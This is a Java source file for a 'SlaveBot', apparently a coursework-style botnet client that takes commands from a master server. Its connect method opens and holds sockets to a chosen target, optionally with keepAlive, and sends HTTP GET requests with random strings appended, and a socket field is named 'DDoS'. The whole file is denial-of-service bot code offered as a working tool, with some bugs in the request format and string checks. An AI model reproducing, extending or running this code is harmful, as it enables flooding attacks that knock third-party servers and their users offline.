import java.net.*;
import java.util.*;
import java.io.*;

public class SlaveBot
{
//--variable declarations----------------------------------------------------------------------------------------------------------------------
	static ArrayList<Socket> connectedToRemoteHost = new ArrayList<>();
	static HashMap<String, ArrayList<Socket>> slavetoRemote = new HashMap<String, ArrayList<Socket>>();
	Socket DDoS;
//--main---------------------------------------------------------------------------------------------------------------------------------------
	public static void main(String[] args) 
	{
		int port = 0;
		String ip = null;
		
		//for connection done for the first time
		if(args.length != 0)
		{
			//input format example = "java SlaveBot -h localhost -p 9999"
			if (args.length == 4) 
			{
				ip = args[1];
				port = Integer.parseInt(args[3]);
			}
			
			//input format example = "java SlaveBot -h localhost 9999"
			else if(args.length == 3)
			{
				ip = args[1];
				port = Integer.parseInt(args[2]);
			}
			
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("> Connected To Server : " + client.getRemoteSocketAddress() + "\n>");
			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
		//for connection done by the command line
		while(true)
		{
			Scanner reader = new Scanner(System.in);
			String line = reader.nextLine();
			String[] dataArray = line.split("\\s+");
			System.out.print("> ");
			//loop if no data is entered
			if (line.equals("")) 
			{
				continue;
			}
//----------exit function logic
			else if (line.equalsIgnoreCase("exit") || line.equalsIgnoreCase("quit") || line.equalsIgnoreCase("-1"))
			{
				System.out.println("Program Terminated.");
				System.exit(0);
			}
			//input format example = -h localhost -p 9999
			else if(dataArray.length == 4)
			{
				ip = dataArray[1];
				port = Integer.parseInt(dataArray[3]);
			}
			//input format example = -h localhost 9999
			else if(dataArray.length == 3)
			{
				ip = dataArray[1];
				port = Integer.parseInt(dataArray[2]);
			}
//----------for random input format
			else
			{
				continue;
			}
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("Connected To Server" + client.getRemoteSocketAddress());
			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
	}
//--connect------------------------------------------------------------------------------------------------------------------------------------
	public HashMap<String, ArrayList<Socket>> connect(Socket selectedSlave, String targetIP, int targetPort, boolean keepAlive, String url) throws IOException
	{
		try
		{
			ArrayList<Socket> socketListForMap = new ArrayList<>();
			DDoS = new Socket();
			DDoS.connect(new InetSocketAddress(targetIP, targetPort));
			if(DDoS.isConnected())
			{
				connectedToRemoteHost.add(DDoS);
				socketListForMap.add(DDoS);
				System.out.println("Client " + selectedSlave.getRemoteSocketAddress() + " connected to " + DDoS.getInetAddress() + " via " + DDoS.getPort());
			}
			// if keep alive is requested from the master
			if (keepAlive) 
			{
				DDoS.setKeepAlive(true);
				System.out.println("keepAlive function is also active for this connection.\n");
			}
			// if url functionality is provided by the master
			if (url != "" && url != null) 
			{
				BufferedWriter bw = new BufferedWriter (new OutputStreamWriter(DDoS.getOutputStream()));
				BufferedReader br = new BufferedReader (new InputStreamReader(DDoS.getInputStream()));
				bw.write("GET " + url + getRandomString() + "HTTP/1.1\n\nHost: "+ targetIP);
				bw.flush();
				System.out.println(br.readLine() + " random string used " + url + getRandomString() + "\n");
				bw.close();
				br.close();
			}
			
			
			for (String key : slavetoRemote.keySet()) 
			{
				if (key.equalsIgnoreCase(selectedSlave.getRemoteSocketAddress().toString())) 
				{
					if (slavetoRemote.containsValue(socketListForMap) || slavetoRemote.get(key) != null) 
					{
						socketListForMap= slavetoRemote.get(key);
					} 
					else 
					{
						socketListForMap = new ArrayList<>();
					}
					socketListForMap.add(DDoS);
				}
			}
			
			slavetoRemote.put(selectedSlave.getRemoteSocketAddress().toString(), socketListForMap);
			
		} catch(IOException e)
		{
			System.out.println("Connection Lost.");
			e.printStackTrace();
		}
		return slavetoRemote;
	}
//--disconnect---------------------------------------------------------------------------------------------------------------------------------
	public void disconnect(Socket selectedSocket, String targetIPAddress, int targetPort) throws IOException
	{
		try
		{
			if (!selectedSocket.isClosed()) 
			{
				System.out.println("Disconnection to " + selectedSocket.toString() + " was successful.");
				selectedSocket.close();
			}
		} catch(IOException e)
		{
			System.out.println("Disconnection Failure.");
			e.printStackTrace();
		}
	}
//--getRandomString----------------------------------------------------------------------------------------------------------------------------
	public String getRandomString()
	{
		char[] charStream = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 0; i < 20; i++) {
		    char c = charStream[random.nextInt(charStream.length)];
		    stringBuilder.append(c);
		}
		String randomString = stringBuilder.toString();
		return randomString;
	}
}	
